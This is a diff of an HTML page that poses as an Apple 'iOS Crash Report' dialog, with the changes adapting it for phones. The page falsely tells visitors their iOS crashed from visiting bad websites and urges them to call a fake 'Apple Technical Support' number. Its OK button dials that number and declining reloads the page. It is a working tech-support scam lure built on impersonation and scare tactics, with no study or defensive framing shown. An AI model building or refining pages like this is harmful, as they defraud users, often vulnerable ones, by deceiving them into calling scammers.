@@ -1,67 +1,74 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>iOS Crash Report</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #f0f0f0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        }
-        .dialog {
-            background: white;
-            padding: 30px 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            text-align: center;
-            width: 300px;
-        }
-        .dialog p {
-            margin: 15px 0;
-            font-size: 14px;
-            color: #333;
-        }
-        .dialog b {
-            font-weight: bold;
-        }
-        .button {
-            margin-top: 20px;
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #007AFF;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iOS Crash Report</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #f2f2f7;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    }
+    .dialog {
+      background: #fff;
+      padding: 30px 25px;
+      border-radius: 20px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+    .dialog p {
+      margin: 18px 0;
+      font-size: 16px;
+      color: #1c1c1e;
+      line-height: 1.5;
+    }
+    .dialog b {
+      font-weight: bold;
+    }
+    .button {
+      margin-top: 25px;
+      padding: 14px 25px;
+      font-size: 18px;
+      background-color: #007aff;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .button:hover {
+      background-color: #005ecb;
+    }
+  </style>
 </head>
 <body>
 
 <div class="dialog">
-    <p><b>**** iOS Crash Report ****</b></p>
-    <p>iOS crashed previously due to unwanted websites visit.</p>
-    <p>There is a problem with the configuration of your <b>iOS</b>.</p>
-    <p>Please call <b>Apple Technical Support</b> at <b>1-888-888-8888</b>.</p>
-    <p>Click on OK, this will attempt to send a crash report to Apple.</p>
-    <p>Call now: <b>1-888-888-8888</b></p>
-    <button class="button" onclick="handleClick()">OK</button>
+  <p><b>**** iOS Crash Report ****</b></p>
+  <p><b>iOS</b> crashed previously due to unwanted websites visit.</p>
+  <p>There is a problem with the configuration of your <b>iOS</b>.</p>
+  <p>Please call <b>Apple Technical Support</b> at <b>1-888-888-8888</b>.</p>
+  <p>Click on OK, this will attempt to send a crash report to Apple.</p>
+  <p>Call now: <b>1-888-888-8888</b></p>
+  <button class="button" onclick="handleClick()">OK</button>
 </div>
 
 <script>
 function handleClick() {
-    const confirmCall = confirm("Do you want to call Apple Technical Support?");
-    if (confirmCall) {
-        window.location.href = "tel:18888888888";
-    } else {
-        location.reload();
-    }
+  const confirmCall = confirm("Do you want to call Apple Technical Support?");
+  if (confirmCall) {
+    window.location.href = "tel:18888888888";
+  } else {
+    location.reload();
+  }
 }
 </script>
 
